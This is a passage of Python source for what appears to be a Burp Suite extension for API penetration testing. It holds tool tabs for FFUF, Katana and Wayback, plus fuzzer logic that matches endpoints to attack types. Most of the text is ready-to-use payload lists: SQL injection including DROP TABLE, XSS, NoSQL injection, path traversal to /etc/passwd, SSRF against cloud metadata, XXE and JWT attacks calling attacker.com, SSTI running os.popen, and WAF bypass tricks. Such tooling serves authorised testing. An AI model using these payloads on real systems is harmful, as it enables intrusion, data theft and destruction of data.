                "Send to Recon",
                Color(76, 175, 80),
                lambda e: self._import_katana_to_recon(),
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.katana_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.katana_area.getText()),
            )
        )

        panel.add(controls, BorderLayout.NORTH)

        self.katana_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.katana_discovered = []
        self.katana_lock = threading.Lock()
        return panel

    def _create_ffuf_tab(self):
        """Create FFUF fuzzer tab"""
        panel = JPanel(BorderLayout())

        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("FFUF Path:"))
        import os

        default_ffuf = os.path.expanduser("~/go/bin/ffuf")
        self.ffuf_path_field = JTextField(
            default_ffuf if os.path.exists(default_ffuf) else "ffuf", 20
        )
        controls.add(self.ffuf_path_field)
        controls.add(JLabel("Wordlist:"))
        import os

        default_wordlist = os.path.expanduser("~/wordlists/api-endpoints.txt")
        if not os.path.exists(default_wordlist):
            default_wordlist = os.path.expanduser("~/wordlists/common.txt")
        if not os.path.exists(default_wordlist):
            default_wordlist = "/usr/share/wordlists/dirb/common.txt"
        self.ffuf_wordlist_field = JTextField(default_wordlist, 20)
        controls.add(self.ffuf_wordlist_field)
        controls.add(
            self._create_action_button(
                "Fuzz Directories", Color(255, 87, 34), lambda e: self._run_ffuf(e)
            )
        )
        controls.add(
            self._create_action_button(
                "Export Results",
                Color(70, 130, 180),
                lambda e: self._export_ffuf_results(),
            )
        )
        controls.add(
            self._create_action_button(
                "Send to Intruder",
                Color(255, 140, 0),
                lambda e: self._send_ffuf_to_intruder(),
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.ffuf_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.ffuf_area.getText()),
            )
        )

        panel.add(controls, BorderLayout.NORTH)

        self.ffuf_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.ffuf_results = []
        self.ffuf_lock = threading.Lock()
        return panel

    def _create_wayback_tab(self):
        """Create Wayback Machine discovery tab"""
        panel = JPanel(BorderLayout())
        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("Wayback:"))
        controls.add(
            self._create_action_button(
                "Discover", Color(138, 43, 226), lambda e: self._run_wayback()
            )
        )
        controls.add(
            self._create_action_button(
                "Send to Recon",
                Color(76, 175, 80),
                lambda e: self._import_wayback_to_recon(),
            )
        )
        controls.add(
            self._create_action_button(
                "Export Results",
                Color(70, 130, 180),
                lambda e: self._export_wayback_results(),
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.wayback_area.getText()),
            )
        )
        controls.add(JLabel(" | From:"))
        self.wayback_from_field = JTextField("2020", 4)
        controls.add(self.wayback_from_field)
        controls.add(JLabel("To:"))
        self.wayback_to_field = JTextField(str(time.localtime().tm_year), 4)
        controls.add(self.wayback_to_field)
        controls.add(JLabel(" | Limit:"))
        self.wayback_limit_field = JTextField("100", 3)
        controls.add(self.wayback_limit_field)
        controls.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.wayback_area.setText("")
            )
        )
        panel.add(controls, BorderLayout.NORTH)
        self.wayback_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.wayback_discovered = []
        self.wayback_lock = threading.Lock()
        return panel

    # ============================================================================
    # PAYLOAD GENERATORS - NAVIGATION: Search "PAYLOAD GENERATORS" to jump here
    # ============================================================================

    def _get_idor_payloads(self, param_type="numeric"):
        if param_type == "uuid":
            return [
                "00000000-0000-0000-0000-000000000000",
                "ffffffff-ffff-ffff-ffff-ffffffffffff",
                "11111111-1111-1111-1111-111111111111",
                "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
                "deadbeef-dead-beef-dead-beefdeadbeef",
                "12345678-1234-5678-1234-567812345678",
            ]
        if param_type == "objectid":
            return [
                "000000000000000000000000",
                "111111111111111111111111",
                "507f1f77bcf86cd799439011",
                "aaaaaaaaaaaaaaaaaaaaaaaa",
                "ffffffffffffffffffffffff",
            ]
        return [
            "1","2","3","10","100","1000","9999","99999","0","-1","-999",
            "2147483647","-2147483648","4294967295","9223372036854775807",
            "admin","root","test","user","guest","administrator","system",
            "me","self","current","../","..%2f","..%252f","....//","..;/",
            "%2e%2e%2f","..\\..\\\\","null","undefined","NaN","Infinity",
            "*","%","$","_","true","false","yes","no","[]","{}","''",
            '""',"()","1.0","1e10","0x1","0o1","1;--","1'--","1/*",
        ]

    def _get_bola_techniques(self):
        return {
            "horizontal": [
                "Swap user IDs",
                "Enumerate sequential IDs",
                "Guess common usernames",
            ],
            "vertical": [
                "Escalate to admin ID",
                "Access system resources",
                "Modify role parameters",
            ],
            "wildcard": [
                "Use * or % wildcards",
                "Empty/null ID",
                "Array injection [1,2,3]",
            ],
            "guid_attack": [
                "Brute force GUIDs",
                "Predict v1 UUIDs (timestamp-based)",
                "Try common test GUIDs",
            ],
            "path_manipulation": [
                "../admin/resource",
                "../../other_user",
                "Absolute paths /api/admin/1",
            ],
            "parameter_pollution": [
                "id=1&id=2",
                "user_id=victim&user_id=attacker",
                "Duplicate params",
            ],
            "method_override": [
                "X-HTTP-Method-Override: PUT",
                "Change GET to POST",
                "OPTIONS to bypass",
            ],
            "encoding": ["URL encode IDs", "Double encode", "Unicode normalization"],
            "type_confusion": ["String to int", "Array to object", "JSON to XML"],
            "batch_requests": [
                "GraphQL batching",
                "JSON array of IDs",
                "Bulk operations",
            ],
        }

    def _get_race_condition_payloads(self):
        return {
            "techniques": [
                "Parallel requests",
                "Turbo Intruder",
                "Single-packet attack",
            ],
            "targets": [
                "Coupon redemption",
                "Balance deduction",
                "Inventory check",
                "Rate limits",
            ],
            "timing": [
                "Send 20+ simultaneous requests",
                "Use connection warming",
                "HTTP/2 single-packet",
            ],
        }

    def _get_graphql_attacks(self):
        return {
            "introspection": ["query{__schema{types{name,fields{name}}}}"],
            "batching": ["[{query:user(id:1)},{query:user(id:2)}]"],
            "depth": ["query{user{posts{comments{replies{replies{replies}}}}}}"],
            "aliases": ["query{u1:user(id:1) u2:user(id:2) u3:user(id:3)}"],
            "mutations": [
                "mutation{deleteUser(id:1)}",
                "mutation{updateRole(id:1,role:admin)}",
            ],
        }

    def _get_jwt_attacks(self):
        return {
            "alg_confusion": [
                "alg:none",
                "alg:HS256 with RSA key",
                "alg:None",
                "alg:nOnE",
            ],
            "kid_injection": [
                "kid:/etc/passwd",
                "kid:../../key",
                "kid:http://attacker.com/key",
            ],
            "jku_jti": ["jku:http://attacker.com/jwks.json", "jti:null"],
            "claims": ["exp:9999999999", "iat:-1", "nbf:0", "sub:admin", "role:admin"],
            "signature": [
                "Empty signature",
                "Null byte in signature",
                "Strip signature",
            ],
        }

    def _get_api_abuse_vectors(self):
        return {
            "rate_limit_bypass": [
                "X-Forwarded-For rotation",
                "User-Agent rotation",
                "Multiple API keys",
            ],
            "cache_poisoning": ["X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL"],
            "smuggling": [
                "Content-Length vs Transfer-Encoding",
                "CL.TE",
                "TE.CL",
                "TE.TE",
            ],
            "desync": ["HTTP/2 downgrade", "Connection reuse", "Pipeline abuse"],
            "prototype_pollution": [
                "__proto__",
                "constructor.prototype",
                "Object.prototype",
            ],
        }

    def _get_business_logic_tests(self):
        return {
            "price_manipulation": ["-1", "0", "0.01", "999999999", "1e10"],
            "quantity_abuse": ["-1", "0", "999999", "2147483647"],
            "workflow_bypass": [
                "Skip payment step",
                "Direct checkout",
                "Replay old state",
            ],
            "time_manipulation": ["Future dates", "Past dates", "Timezone abuse"],
            "currency_confusion": ["USD to cents", "EUR to USD", "Negative amounts"],
        }

    def _get_sqli_payloads(self):
        return [
            "'","''","\"","\"\"","`","``",
            "' OR '1'='1","' OR 1=1--","' OR 'a'='a","\" OR \"1\"=\"1",
            "' OR '1'='1'--","' OR '1'='1'/*","' OR '1'='1'#",
            "1' OR '1'='1","1' OR 1=1--","admin' OR '1'='1","admin'--",
            "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--",
            "' UNION ALL SELECT NULL--","' UNION SELECT @@version--",
            "'; WAITFOR DELAY '0:0:5'--","'; SELECT SLEEP(5)--",
            "' AND SLEEP(5)--","1' AND SLEEP(5)#","')","))",")))",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "'; DROP TABLE users--","' ORDER BY 1--","' ORDER BY 10--",
            "admin'#","admin'/*","admin' OR 1=1#",
            "' AND '1'='1","' AND '1'='2","1' AND '1'='1","1' AND '1'='2",
            "' OR 1=1 LIMIT 1--","' OR 1=1 LIMIT 1#","' OR 1=1 LIMIT 1/*",
            "' UNION SELECT NULL,NULL,NULL--","' UNION SELECT 1,2,3--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",
            "' AND 1=CAST(@@version AS INT)--",
            "'; EXEC sp_MSforeachtable 'DROP TABLE ?'--",
            "' OR EXISTS(SELECT * FROM users)--",
            "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
            "1' AND '1'='1' AND '1'='1","1' AND '1'='2' OR '1'='1",
            "\\' OR 1=1--","\\\\' OR 1=1--","' OR 'x'='x","') OR ('x'='x",
            "')) OR (('x'='x","'))) OR ((('x'='x",
            "' OR username IS NOT NULL--","' OR 1=1%00","' OR 1=1;%00",
            "admin' AND 1=0 UNION ALL SELECT NULL,NULL,NULL--",
            "' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'||(SELECT SLEEP(5))||'","'+(SELECT SLEEP(5))+'",'"+(SELECT 0 WHERE 0 LIKE 0)+"',
        ]

    def _get_xss_payloads(self):
        return [
            "<script>alert(1)</script>","<script>alert(document.domain)</script>",
            "<img src=x onerror=alert(1)>","<svg onload=alert(1)>",
            "<body onload=alert(1)>","<input onfocus=alert(1) autofocus>",
            "'><script>alert(1)</script>","\"><script>alert(1)</script>",
            "</script><script>alert(1)</script>","</title><script>alert(1)</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "{{7*7}}","${7*7}","<%= 7*7 %>","#{7*7}",
            "{{constructor.constructor('alert(1)')()}}",
            "javascript:alert(1)","javascript:alert(document.cookie)",
            "data:text/html,<script>alert(1)</script>",
            "<svg><script>alert(1)</script></svg>",
            "<iframe src=javascript:alert(1)>",
            "<img src=x onerror=\"alert(1)\">","<svg/onload=alert(1)>",
            "<img src=x onerror=alert`1`>","<svg onload=alert`1`>",
            "<img src=x onerror=\\u0061lert(1)>",
            "<img src=x onerror=\\x61lert(1)>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "<details open ontoggle=alert(1)>","<marquee onstart=alert(1)>",
            "<video src=x onerror=alert(1)>","<audio src=x onerror=alert(1)>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<keygen onfocus=alert(1) autofocus>",
            "<body onpageshow=alert(1)>","<body onhashchange=alert(1)>",
            "<svg><animate onbegin=alert(1)>","<svg><set onbegin=alert(1)>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
            "<form action=javascript:alert(1)><input type=submit>",
            "<isindex action=javascript:alert(1) type=submit>",
            "<math><mi xlink:href=javascript:alert(1)>click",
            "<svg><a xlink:href=javascript:alert(1)><text x=0 y=20>XSS</text></a></svg>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
            "<img src=x:alert(1) onerror=eval(src)>",
            "<img src=x onerror=this.src='javascript:alert(1)'>",
            "<img src=x onerror=Function`a${'alert(1)'}a`()>",
            "<iframe srcdoc=\"<script>alert(1)</script>\">",
            "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
            "<base href=javascript:alert(1)//>",
            "<link rel=import href=data:text/html,<script>alert(1)</script>>",
            "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
            "<style>@import'javascript:alert(1)';</style>",
            "<style>*{background:url('javascript:alert(1)')}</style>",
            "<xss id=x tabindex=1 onfocus=alert(1)></xss>",
            "<xss onclick=alert(1)>click","<xss onmouseover=alert(1)>hover",
            "'-alert(1)-'",'"-alert(1)-"',"javascript:alert(1)//",
            "<script>alert(1)//","<script>alert(1)<!--","<script>alert(1)</script",
            "<ScRiPt>alert(1)</sCrIpT>","<script>al\u0065rt(1)</script>",
            "<script>al\x65rt(1)</script>","<script>\u0061lert(1)</script>",
        ]

    def _get_nosqli_payloads(self):
        return [
            "{'$gt':''}","{'$ne':null}","{'$regex':'.*'}","{'$exists':true}",
            "{'$nin':[]}","{'$or':[{},{'a':'a'}]}","[$ne]=1","[$gt]=",
            "[$regex]=.*","[$exists]=true","[$or][0][admin]=1","[$where]=1",
            '{"$where":"1==1"}','{"$where":"return true"}',
            '{"$where":"this.password.match(/.*/)"}',
            "{'username':{'$regex':'^admin'}}","{'password':{'$regex':'.*'}}",
            "{'username':{'$type':2}}","{'password':{'$type':1}}",
            "{'$gt':0}","{'$gte':0}","{'$lt':999999}","{'$lte':999999}",
            "{'$in':['admin','root']}","{'$nin':['']}",
            "{'$not':{'$eq':''}}","{'$nor':[{'a':1}]}",
            "[$ne]=","[$gt]=0","[$gte]=0","[$lt]=999999","[$nin][]=",
            "[$in][]=admin","[$in][]=root","[$regex]=^.*$","[$options]=i",
            '{"$where":"sleep(5000)"}','{"$where":"return sleep(5000)"}',
            "{'$expr':{'$eq':['$password','$password']}}",
            "{'$jsonSchema':{}}","{'$text':{'$search':'admin'}}",
            "{'$mod':[2,0]}","{'$all':[]}","{'$elemMatch':{}}",
            "{'$size':0}","{'$bitsAllSet':0}","{'$comment':'injection'}",
            "username[$ne]=invalid&password[$ne]=invalid",
            "username[$regex]=.*&password[$regex]=.*",
            "username[$gt]=&password[$gt]=",
            "login[$regex]=a.*&pass[$ne]=1",
            "{'username':{'$ne':''},'password':{'$ne':''}}",
            "{'$or':[{'username':'admin'},{'username':'root'}]}",
            "{'$and':[{'$or':[{'username':'admin'}]},{'$or':[{'password':{'$ne':''}}]}]}",
        ]

    def _get_path_traversal_payloads(self):
        return [
            # Basic
            "../",
            "..%2f",
            "..\\",
            "..%5c",
            "..;",
            # Multiple levels
            "../../",
            "../../../",
            "../../../../",
            "../../etc/passwd",
            "../../../etc/passwd",
            # Encoded
            "..%2f..%2f",
            "..%252f..%252f",
            "..%c0%af..%c0%af",
            # Double encoding
            "..%252f..%252fetc%252fpasswd",
            # Bypass filters
            "....//....//",
            "..../..../",
            "....\\....\\",
            # Absolute paths
            "/etc/passwd",
            "/etc/shadow",
            "/windows/win.ini",
            "C:\\windows\\win.ini",
            "C:/windows/win.ini",
            # Null byte
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            # Wrappers
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
        ]

    def _get_ssrf_payloads(self):
        return [
            # Internal IPs
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://[::ffff:127.0.0.1]",
            # Private networks
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            # Cloud metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            # Bypass filters
            "http://127.1",
            "http://0x7f.0x0.0x0.0x1",
            "http://2130706433",
            "http://127.0.0.1.nip.io",
            "http://127.0.0.1.xip.io",
            # DNS rebinding
            "http://spoofed.burpcollaborator.net",
            # File protocol
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
        ]

    def _get_xxe_payloads(self):
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
        ]

    def _get_ssti_payloads(self):
        return [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{config}}",
            "{{self}}",
            "${applicationScope}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('calc')}",
            "*{7*7}",
            "@{7*7}",
            "~{7*7}",
        ]

    def _get_deserialization_payloads(self):
        return [
            'O:8:"stdClass":0:{}',
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
            '{"@type":"java.net.Inet4Address","val":"attacker.com"}',
            "aced0005737200",
            "YToxOntzOjM6XCJmb29cIjtzOjM6XCJiYXJcIjt9",
        ]

    # ============================================================================
    # WAF BYPASS PAYLOADS - NAVIGATION: Search "WAF BYPASS" to jump here
    # ============================================================================

    def _get_waf_bypass_headers(self):
        """Header-based WAF bypass (IP spoofing, host manipulation, smuggling)"""
        return [
            # IP spoofing (basic)
            "X-Forwarded-For: 127.0.0.1",
            "X-Originating-IP: 127.0.0.1",
            "X-Remote-IP: 127.0.0.1",
            "X-Remote-Addr: 127.0.0.1",
            "X-Client-IP: 127.0.0.1",
            "Client-IP: 127.0.0.1",
            "X-Real-IP: 127.0.0.1",
            "True-Client-IP: 127.0.0.1",
            # Advanced IP spoofing
            "X-Forwarded-For: 127.0.0.1, 127.0.0.1",  # Multiple IPs
            "X-Forwarded-For: localhost",  # Hostname instead of IP
            "X-Forwarded-For: [::1]",  # IPv6 localhost
            "X-Forwarded-For: 0.0.0.0",  # Wildcard IP
            # Host manipulation
            "X-Host: 127.0.0.1",
            "X-Forwarded-Host: 127.0.0.1",
            "X-Forwarded-Host: localhost",
            # URL rewriting
            "X-Original-URL: /admin",
            "X-Rewrite-URL: /admin",
            "X-Custom-IP-Authorization: 127.0.0.1",
            # Protocol manipulation
            "X-Forwarded-Proto: https",
            "X-Forwarded-Scheme: https",
            "Front-End-Https: on",
            # Cache poisoning
            "X-Forwarded-Host: evil.com",
            "X-Host: evil.com",
            # Request smuggling helpers
            "Transfer-Encoding: chunked",
            "Content-Length: 0",
        ]

    def _get_waf_bypass_encoding(self):
        """Encoding bypass (URL/Unicode/Hex/HTML entities, case variation)"""
        return {
            # Single URL encoding
            "url_encode": ["%27", "%3C", "%3E", "%22", "%2F", "%20", "%3B", "%28", "%29"],
            # Double URL encoding (bypasses single decode)
            "double_encode": ["%2527", "%253C", "%253E", "%2522", "%252F"],
            # Triple encoding (for aggressive WAFs)
            "triple_encode": ["%25252527", "%2525253C"],
            # Unicode encoding
            "unicode": ["\\u0027", "\\u003c", "\\u003e", "\\u0022", "\\u002f"],
            # Unicode overlong encoding
            "unicode_overlong": ["\\u00027", "\\u0003c"],
            # Hex encoding
            "hex": ["\\x27", "\\x3c", "\\x3e", "\\x22", "\\x2f"],
            # Octal encoding
            "octal": ["\\047", "\\074", "\\076"],
            # HTML entity encoding
            "html_entity": ["&#39;", "&#60;", "&#62;", "&lt;", "&gt;", "&quot;"],
            # Mixed case (bypasses case-sensitive rules)
            "mixed_case": ["<ScRiPt>", "SeLeCt", "UnIoN", "oR", "AnD", "WhErE"],
            # UTF-7 encoding
            "utf7": ["+ADw-script+AD4-", "+ADw-img src+AD0-x+AD4-"],
            # Null byte injection
            "null_byte": ["%00", "\\x00", "\\0"],
            # Newline/tab injection
            "whitespace": ["%0a", "%0d", "%09", "\\n", "\\r", "\\t"],
        }

    def _get_waf_bypass_http_methods(self):
        """HTTP method manipulation (override headers, verb tampering)"""
        return {
            # Method override headers
            "method_override_headers": [
                "X-HTTP-Method-Override: PUT",
                "X-HTTP-Method-Override: DELETE",
                "X-HTTP-Method-Override: PATCH",
                "X-Method-Override: PUT",
                "X-Method-Override: DELETE",
                "_method=PUT",  # Query parameter
                "_method=DELETE",
            ],
            # Case variations (bypass case-sensitive filters)
            "case_variations": ["GeT", "PoSt", "pUt", "DeLeTe", "PaTcH", "OpTiOnS"],
            # Verb tampering (uncommon methods)
            "verb_tampering": ["TRACE", "TRACK", "DEBUG", "CONNECT", "PROPFIND", "PROPPATCH"],
            # Arbitrary methods
            "arbitrary_methods": ["HACK", "ADMIN", "TEST", "CUSTOM"],
            # Whitespace injection
            "whitespace_methods": ["GET ", " GET", "GET\\t", "GET\\n"],
        }

    def _get_waf_bypass_path_tricks(self):
        """Path manipulation (dot encoding, null bytes, Unicode tricks)"""
        return [
            # Basic path pollution
            "//",
            "/.//",
            "/./",
            # Encoded dots
            "/%2e/",
            "/%2e%2e/",
            "/%252e/",  # Double encoded
            # Semicolon tricks
            "/;/",
            "/;foo=bar/",
            "/..;/",
            "/.;/",
            # Null byte injection
            "/%00/",
            "/%00.html",
            # Newline/tab injection
            "/%0a/",
            "/%0d/",
            "/%09/",
            # Backslash (Windows)
            "/\\/",
            "/..\\../",
            # Unicode normalization
            "/\\u002e\\u002e/",
            # Question mark trick
            "/?/",
            "/#/",
            # Multiple slashes
            "///",
            "////",
            # Dot variations
            "/...//",
            "/..../",
        ]

    def _get_waf_bypass_content_type(self):
        """Content-Type manipulation (charset variations, boundary tricks)"""
        return [
            # Standard types
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "text/plain",
            "application/json",
            "application/json; charset=utf-8",
            "application/xml",
            "text/xml",
            # Charset variations
            "application/json; charset=iso-8859-1",
            "application/json; charset=utf-16",
            "application/json; charset=utf-32",
            # Case variations
            "Application/Json",
            "APPLICATION/JSON",
            "application/JSON",
            # With boundary (multipart)
            "multipart/form-data; boundary=----WebKitFormBoundary",
            # Uncommon types
            "application/octet-stream",
            "application/x-amf",
            "text/html",
            # Empty/null
            "",
            "null",
        ]

    # ============================================================================
    # DATA ACCESS HELPERS - NAVIGATION: Search "DATA ACCESS" to jump here
    # ============================================================================

    def _get_entry(self, entries):
        """Get single entry from list or dict - handles both capture and import"""
        if isinstance(entries, list):
            return entries[0] if entries else {}
        return entries

    # ============================================================================
    # FUZZER CORE LOGIC - NAVIGATION: Search "FUZZER CORE" to jump here
    # ============================================================================

    def _normalize_endpoint_data(self, entry):
        """Normalize endpoint data to consistent format"""
        params = entry.get("parameters", {})
        param_patterns = entry.get("param_patterns", {})

        return {
            "path": entry["normalized_path"],
            "method": entry["method"],
            "auth": entry.get("auth_detected", []),
            "params": {
                "url": self._normalize_param_list(params.get("url", [])),
                "body": self._normalize_param_list(params.get("body", [])),
                "json": self._normalize_param_list(params.get("json", [])),
                "cookie": self._normalize_param_list(params.get("cookie", [])),
            },
            "reflected": (
                param_patterns.get("reflected", [])
                if isinstance(param_patterns, dict)
                else []
            ),
            "content_type": entry.get("content_type", ""),
            "response_status": entry.get("response_status", 200),
            "response_body": entry.get("response_body", ""),
        }

    def _normalize_param_list(self, param_data):
        """Convert params to list format (handles dict or list)"""
        if isinstance(param_data, dict):
            return list(param_data.keys())
        elif isinstance(param_data, list):
            return param_data
        return []

    def _check_idor(self, normalized, attack_type):
        """Check if endpoint is vulnerable to IDOR - verify ID params are used"""
        if attack_type not in ["BOLA", "IDOR", "All"]:
            return None
        path = normalized["path"]
        if "{id}" not in path and "{uuid}" not in path and "{objectid}" not in path:
            return None
        
        # Verify ID parameters are actually present in URL params
        params = normalized["params"]
        has_id_param = any(
            "id" in str(p).lower() for p in params.get("url", [])
        )
        
        # Skip if path has {id} but no actual ID parameter (likely frontend route)
        if not has_id_param and "{id}" in path:
            # Check if it's a REST API pattern (not frontend route)
            if not any(indicator in path.lower() for indicator in ["/api/", "/v1/", "/v2/", "/v3/"]):
                return None

        param_type = "uuid" if "{uuid}" in path else "numeric"
        techniques = self._get_bola_techniques()

        return {
            "type": "IDOR/BOLA",
            "payloads": self._get_idor_payloads(param_type)[:8],
            "techniques": {
                "horizontal": techniques["horizontal"],
                "vertical": techniques["vertical"],
                "wildcard": techniques["wildcard"][:3],
                "encoding": techniques["encoding"],
                "param_pollution": techniques["parameter_pollution"][:2],
            },
            "test": "Horizontal/vertical privilege escalation, wildcard injection, encoding bypass",
            "risk": "Access/modify other users' resources, privilege escalation",
            "note": "Verify endpoint exists (not 404) and requires authentication before testing"
        }

    def _check_bola(self, normalized, attack_type):
        """Check for BOLA-specific attacks (all endpoints with auth)"""
        if attack_type not in ["BOLA", "All"]:
            return None
        if "None" in normalized["auth"]:
            return None

        techniques = self._get_bola_techniques()
        method = normalized["method"]

        attacks = []
        if method in ["GET", "POST", "PUT", "PATCH", "DELETE"]:
            attacks.append("Remove Authorization header")
            attacks.append("Use expired/invalid token")
        if "Bearer Token" in normalized["auth"]:
            attacks.extend(
                ["JWT alg:none", "JWT null signature", "JWT kid manipulation"]
            )
        if method in ["PUT", "PATCH", "DELETE"]:
            attacks.extend(techniques["method_override"])

        return {
            "type": "BOLA",
            "attacks": attacks,
            "techniques": {
                "horizontal": techniques["horizontal"],
                "vertical": techniques["vertical"],
                "batch": techniques["batch_requests"],
                "type_confusion": techniques["type_confusion"],
            },
            "test": "Test all authenticated endpoints for broken object level authorization",
            "risk": "Unauthorized access to resources belonging to other users",
            "auth_required": True,
            "note": "[!] REQUIRES AUTHENTICATION: Capture authenticated traffic first or provide valid tokens"
        }

    def _check_auth_bypass(self, normalized, attack_type):
        """Check if endpoint has auth bypass potential"""
        if attack_type not in ["Auth Bypass", "All"]:
            return None
        if "None" in normalized["auth"]:
            return None
        details = ["Remove auth, invalid tokens, expired tokens"]
        if "Bearer Token" in normalized["auth"]:
            details.append("JWT: alg:none, weak secret, expired token")
        if "Session Cookie" in normalized["auth"]:
            details.append("Cookie: Tamper session ID, fixation, hijacking")
        return {
            "type": "Auth Bypass",
            "details": details,
            "risk": "Unauthorized access",
            "auth_required": True,
            "note": "[!] REQUIRES AUTHENTICATION: Test with valid credentials first"
        }

    def _check_sqli(self, normalized, attack_type):
        """Check if endpoint has SQLi potential - verify params are used"""
        if attack_type not in ["SQLi", "All"]:
            return None
        params = normalized["params"]
        if not params["url"] and not params["body"]:
            return None
        
        # Prioritize endpoints that look like they query databases
        path = normalized["path"].lower()
        likely_db_query = any(
            indicator in path for indicator in [
                "search", "query", "filter", "find", "list", "get", "user", "account"
            ]
        )
        
        return {
            "type": "SQL Injection",
            "params": params["url"][:5] if params["url"] else [],
            "payloads": self._get_sqli_payloads()[:5],
            "risk": "Database compromise",
            "confidence": "High" if likely_db_query else "Medium",
            "note": "Test for actual SQL errors in response before confirming vulnerability"
        }

    def _check_xss(self, normalized, attack_type):
        """Check if endpoint has XSS potential - only for HTML responses"""
        if attack_type not in ["XSS", "All"]:
            return None
        if not normalized["reflected"]:
            return None
        # Only flag XSS for HTML responses (not JSON APIs)
        content_type = normalized["content_type"].lower()
        if "json" in content_type or "xml" in content_type:
            return None
        if "html" not in content_type and "text/plain" not in content_type:
            return None
        return {
            "type": "XSS",
            "reflected": normalized["reflected"],
            "payloads": self._get_xss_payloads()[:4],
            "risk": "Client-side code execution",
            "note": "HTML context detected - reflection in JSON APIs is not XSS"
        }

    def _check_nosqli(self, normalized, attack_type):
        """Check if endpoint has NoSQL injection potential"""
        if attack_type != "All":
            return None
        if "json" not in normalized["content_type"].lower():
            return None
        params = normalized["params"]
        if not params["json"] and not params["body"]:
            return None
        return {
            "type": "NoSQL Injection",
            "payloads": self._get_nosqli_payloads()[:3],
            "risk": "Database bypass",
        }

    def _check_path_traversal(self, normalized, attack_type):
        """Check if endpoint has path traversal potential"""
        if attack_type != "All":
            return None
        path = normalized["path"].lower()
        if not any(p in path for p in ["file", "path", "download", "upload"]):
            return None
        return {
            "type": "Path Traversal",
            "payloads": self._get_path_traversal_payloads()[:4],
            "risk": "File system access",
        }

    def _check_mass_assignment(self, normalized, attack_type):
        """Check if endpoint has mass assignment potential"""
        if attack_type != "All":
            return None
        if normalized["method"] not in ["POST", "PUT", "PATCH"]:
            return None
        return {
            "type": "Mass Assignment",
            "inject": "role=admin, isAdmin=true, permissions=*",
            "risk": "Privilege escalation",
        }

    def _generate_attack_lines(self, key, attack):
        """Generate output lines for an attack"""
        if not attack:
            return []
        lines = ["[{}] {}".format(attack["type"], key)]
        
        # Show authentication requirement warning
        if attack.get("auth_required"):
            lines.append("  [!] AUTH REQUIRED: Test with valid credentials")
        
        # Show confidence level
        if "confidence" in attack:
            lines.append("  Confidence: {}".format(attack["confidence"]))

        # Payloads (limit to 5 for readability)
        if "payloads" in attack:
            payloads = attack["payloads"][:5]
            lines.append("  Payloads: {}".format(", ".join(str(p) for p in payloads)))

        # Attacks (limit to 3)
        if "attacks" in attack:
            attacks = attack["attacks"][:3]
            lines.append("  Attacks: {}".format(", ".join(attacks)))

        # Params (limit to 5)
        if "params" in attack and attack["params"]:
            params = attack["params"][:5]
            lines.append("  Params: {}".format(", ".join(str(p) for p in params)))

        # Reflected (limit to 3)
        if "reflected" in attack:
            reflected = attack["reflected"][:3]
            lines.append("  Reflected: {}".format(", ".join(str(p) for p in reflected)))

        # Test description
        if "test" in attack:
            lines.append("  Test: {}".format(attack["test"]))

        # Inject
        if "inject" in attack:
            lines.append("  Inject: {}".format(attack["inject"]))

        # Risk
        lines.append("  Risk: {}".format(attack["risk"]))
        
        # Important notes
        if "note" in attack:
